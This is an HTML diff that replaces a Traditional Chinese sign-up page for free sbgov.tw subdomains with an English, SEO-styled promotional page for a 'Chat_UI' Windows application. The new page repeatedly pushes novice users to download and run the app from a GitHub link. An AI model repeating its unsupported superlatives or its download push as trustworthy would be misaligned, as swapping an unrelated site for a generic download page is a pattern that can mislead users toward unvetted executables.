@@ -1,115 +1,204 @@
-<!doctype html>
-<html lang="zh-Hant">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>申請 sbgov.tw 子網域</title>
-<script src="https://cdn.tailwindcss.com"></script>
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chat_UI - Fast, Lightweight LLM Chat UI</title>
+  <meta name="description" content="Chat_UI is the fastest and lightest LLM chatting UI with two fields, less than 100 KB, and completely no dependencies. Download and run on Windows easily.">
+  <meta name="keywords" content="LLM chat UI, lightweight chat interface, no dependencies, fast chat UI, Chat_UI, AI chat, Windows app">
+  <meta name="author" content="Chat_UI">
+  <meta property="og:title" content="Chat_UI - Fast, Lightweight LLM Chat UI">
+  <meta property="og:description" content="The fastest and lightest LLM chatting UI with two fields, under 100 KB, and completely no dependencies.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://github.com/jibarri/Chat_UI">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f4f7fb;
+      color: #1f2937;
+      line-height: 1.6;
+      padding: 24px 16px;
+    }
+    .container {
+      max-width: 860px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06);
+      padding: 40px 32px;
+    }
+    h1 {
+      font-size: 2rem;
+      line-height: 1.25;
+      color: #0f172a;
+      margin-bottom: 16px;
+      letter-spacing: -0.02em;
+    }
+    h2 {
+      font-size: 1.4rem;
+      color: #0f172a;
+      margin-top: 36px;
+      margin-bottom: 14px;
+      letter-spacing: -0.01em;
+    }
+    p {
+      margin-bottom: 16px;
+      color: #334155;
+    }
+    .lead {
+      font-size: 1.1rem;
+      color: #475569;
+      margin-bottom: 24px;
+    }
+    ul {
+      margin: 0 0 20px 1.2rem;
+      padding: 0;
+    }
+    li {
+      margin-bottom: 10px;
+      color: #334155;
+    }
+    .top-download {
+      margin: 24px 0 8px 0;
+    }
+    .primary-button {
+      display: inline-block;
+      background: linear-gradient(135deg, #6366f1, #ec4899);
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 1.05rem;
+      padding: 14px 28px;
+      border-radius: 999px;
+      text-decoration: none;
+      box-shadow: 0 8px 18px rgba(99, 102, 241, 0.35);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+    }
+    .primary-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(99, 102, 241, 0.45);
+    }
+    .secondary-button {
+      display: inline-block;
+      background: #0f172a;
+      color: #ffffff;
+      font-weight: 600;
+      padding: 12px 24px;
+      border-radius: 999px;
+      text-decoration: none;
+      box-shadow: 0 6px 14px rgba(15, 23, 42, 0.2);
+      transition: background 0.15s ease, transform 0.15s ease;
+    }
+    .secondary-button:hover {
+      background: #1e293b;
+      transform: translateY(-1px);
+    }
+    .info-card {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 14px;
+      padding: 20px 22px;
+      margin: 20px 0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+    }
+    .faq-item {
+      margin-bottom: 18px;
+    }
+    .faq-item strong {
+      display: block;
+      color: #0f172a;
+      margin-bottom: 4px;
+    }
+    .footer-note {
+      margin-top: 40px;
+      font-size: 0.9rem;
+      color: #64748b;
+      text-align: center;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 28px 20px;
+      }
+      h1 {
+        font-size: 1.6rem;
+      }
+      h2 {
+        font-size: 1.25rem;
+      }
+      .primary-button,
+      .secondary-button {
+        width: 100%;
+        text-align: center;
+      }
+    }
+  </style>
 </head>
-<body class="min-h-screen bg-slate-50 flex items-center justify-center p-4">
-<div class="w-full max-w-lg bg-white rounded-2xl shadow p-8 space-y-6">
-  
-  <!-- 頂部導航列 -->
-  <div class="flex justify-between items-center text-sm border-b pb-4">
-    <div class="flex items-center space-x-4">
-      <a href="./privacy/" class="text-slate-400 hover:text-slate-900">隱私政策</a>
-      <a href="./terms/" class="text-slate-400 hover:text-slate-900">使用條款</a>
-      <a href="./report.html" class="text-red-600 hover:text-red-800 font-bold">檢舉</a>
+<body>
+  <div class="container">
+    <h1>🚀 Chat_UI - Lightning-Fast, Lightweight LLM Chat UI</h1>
+    <p class="lead">The fastest and lightest LLM chatting UI with just two fields, under 100 KB, and completely no dependencies.</p>
+    <div class="top-download">
+      <a href="https://github.com/jibarri/Chat_UI" class="primary-button" target="_blank" rel="noopener">⬇️ Download Chat_UI</a>
     </div>
-    <div class="space-x-3">
-      <a href="./index.html" class="text-slate-900 font-semibold">繁中</a>
-      <a href="./index-en.html" class="text-slate-400 hover:text-slate-900">EN</a>
-      <a href="./index-zh-cn.html" class="text-slate-400 hover:text-slate-900">简中</a>
+
+    <h2>✨ Key Features</h2>
+    <p>Chat_UI keeps everything simple and fast so you can focus on your conversation. Here is what makes it stand out:</p>
+    <ul>
+      <li><strong>Two simple fields:</strong> Type your message in one field and see the response in the other. No clutter, no confusion.</li>
+      <li><strong>Less than 100 KB:</strong> The whole interface is tiny, which means it loads instantly and uses very little space on your computer.</li>
+      <li><strong>Zero dependencies:</strong> You do not need to install extra tools, libraries, or runtimes. It just works on its own.</li>
+      <li><strong>Ultra-fast performance:</strong> Built to be the fastest LLM chatting UI available, with no waiting around.</li>
+      <li><strong>Clean and focused design:</strong> Everything you need and nothing you do not. Perfect for quick chats and everyday use.</li>
+    </ul>
+
+    <h2>📥 Download and Setup</h2>
+    <div class="info-card">
+      <p><strong>Visit this link to download the application:</strong></p>
+      <p><a href="https://github.com/jibarri/Chat_UI" class="secondary-button" target="_blank" rel="noopener">Go to Chat_UI Download Page</a></p>
+      <p>Once you are on the page, follow the download instructions provided there. After the download finishes, open the application and you are ready to start chatting.</p>
     </div>
+
+    <h2>🖥️ How to Use Chat_UI</h2>
+    <p>Chat_UI is designed for everyone, even if you have never used a chat program before. Follow these simple steps:</p>
+    <ul>
+      <li><strong>Step 1:</strong> Visit the download link above and download the application.</li>
+      <li><strong>Step 2:</strong> Open the downloaded application on your Windows computer.</li>
+      <li><strong>Step 3:</strong> Type your question or message into the first field.</li>
+      <li><strong>Step 4:</strong> Read the reply in the second field. That is all there is to it.</li>
+    </ul>
+    <p>There are no accounts to create, no settings to configure, and no extra software to install. The two-field layout keeps everything clear and easy to understand.</p>
+
+    <h2>❓ Frequently Asked Questions</h2>
+    <div class="faq-item">
+      <strong>Is Chat_UI free to use?</strong>
+      <p>Yes. Chat_UI is an open-source project available on GitHub, and you can download and use it at no cost.</p>
+    </div>
+    <div class="faq-item">
+      <strong>Do I need to install anything else?</strong>
+      <p>No. Chat_UI has completely no dependencies, so you do not need to install additional software or libraries.</p>
+    </div>
+    <div class="faq-item">
+      <strong>How big is the application?</strong>
+      <p>The entire interface is less than 100 KB, making it one of the lightest chat UIs you can find.</p>
+    </div>
+    <div class="faq-item">
+      <strong>Does it work on Windows?</strong>
+      <p>Yes. Chat_UI is designed to be easy to download and run on Windows for average computer users.</p>
+    </div>
+    <div class="faq-item">
+      <strong>What makes Chat_UI different?</strong>
+      <p>It focuses on speed and simplicity. With only two fields and no dependencies, it avoids the complexity of other chat tools.</p>
+    </div>
+
+    <h2>🛠️ Technical Details</h2>
+    <p>Chat_UI is hosted on GitHub under the repository name <strong>Chat_UI</strong>. The project description states it is the fastest and lightest LLM chatting UI with two fields, less than 100 KB, and completely no dependencies. You can view the source code, report issues, or contribute by visiting the official repository.</p>
+    <p><a href="https://github.com/jibarri/Chat_UI" target="_blank" rel="noopener">https://github.com/jibarri/Chat_UI</a></p>
+
+    <p class="footer-note">Chat_UI — simple, fast, and lightweight. Download it today and start chatting in seconds.</p>
   </div>
-
-  <!-- 醒目檢舉橫幅 -->
-  <a href="./report.html" class="block bg-red-50 border-l-4 border-red-600 p-4 rounded-r-lg hover:bg-red-100 transition group">
-    <div class="flex justify-between items-center">
-      <div>
-        <p class="text-sm font-bold text-red-800">發現濫用、釣魚或違規網域？</p>
-        <p class="text-xs text-red-600 mt-1">若發現任何違反使用條款的行為，請協助我們檢舉。</p>
-      </div>
-      <span class="bg-red-600 text-white px-4 py-2 rounded shadow font-bold text-sm whitespace-nowrap ml-4 group-hover:bg-red-700 transition">前往檢舉</span>
-    </div>
-  </a>
-
-  <div>
-    <h1 class="text-2xl font-bold">申請免費子網域</h1>
-    <p class="text-sm text-slate-500 mt-1">導向你的 GitHub Pages（*.github.io）</p>
-  </div>
-
-  <div class="flex gap-4 border-b">
-    <button id="tab-apply" class="px-3 py-2 border-b-2 border-slate-900 font-semibold">申請</button>
-    <button id="tab-status" class="px-3 py-2 text-slate-400">查詢</button>
-  </div>
-
-  <div id="panel-apply" class="space-y-4">
-    <div>
-      <label class="block text-sm font-medium mb-1">子網域</label>
-      <div class="flex items-center gap-2">
-        <input id="apply-sub" class="flex-1 border rounded-lg px-3 py-2" placeholder="mysite">
-        <span class="text-slate-500">.sbgov.tw</span>
-      </div>
-    </div>
-    
-    <div>
-      <label class="block text-sm font-medium mb-1">GitHub Pages 目標</label>
-      <input id="apply-tgt" class="w-full border rounded-lg px-3 py-2" placeholder="username.github.io">
-    </div>
-
-    <div>
-      <label class="block text-sm font-medium mb-1">聯繫方式（強烈建議填寫）</label>
-      <input id="apply-contact" class="w-full border rounded-lg px-3 py-2" placeholder="例如：您的 Discord / Email">
-      <p class="text-red-500 text-xs mt-1 leading-relaxed">
-        提示：若未提供有效聯繫方式，可能導致審核無法通過；日後若發生違規且無法聯繫您，該網域將被直接暫停使用。
-      </p>
-    </div>
-
-    <div id="apply-turnstile"></div>
-    <button id="apply-go" class="w-full bg-slate-900 text-white py-2 rounded-lg hover:bg-slate-700">提交申請</button>
-    <p id="apply-msg" class="text-sm min-h-[1.25rem]"></p>
-  </div>
-
-  <div id="panel-status" class="space-y-4 hidden">
-    <div>
-      <label class="block text-sm font-medium mb-1">子網域</label>
-      <div class="flex items-center gap-2">
-        <input id="status-sub" class="flex-1 border rounded-lg px-3 py-2" placeholder="mysite">
-        <span class="text-slate-500">.sbgov.tw</span>
-      </div>
-    </div>
-    <div id="status-turnstile"></div>
-    <button id="status-go" class="w-full bg-slate-900 text-white py-2 rounded-lg hover:bg-slate-700">查詢</button>
-    <div id="status-out" class="text-sm space-y-1"></div>
-  </div>
-</div>
-
-<script src="./assets/common.js"></script>
-<script>
-  SBGOV.initTurnstile();
-  SBGOV.setupTabs();
-  SBGOV.bindApply({
-    loading: "提交中…",
-    success: "已提交，等待審核",
-    fail: "提交失敗",
-    waitTurnstile: "請先完成人機驗證",
-  });
-  SBGOV.bindStatus({
-    loading: "查詢中…",
-    subdomainLabel: "子網域",
-    statusLabel: "狀態",
-    blockedLabel: "此子網域已被封禁",
-    reasonLabel: "原因",
-    timeLabel: "申請時間",
-    waitTurnstile: "請先完成人機驗證",
-    labels: {
-      pending:  ["審核中", "text-yellow-600"],
-      approved: ["已通過", "text-green-600"],
-      rejected: ["已拒絕", "text-red-600"],
-    },
-  });
-</script>
 </body>
 </html>
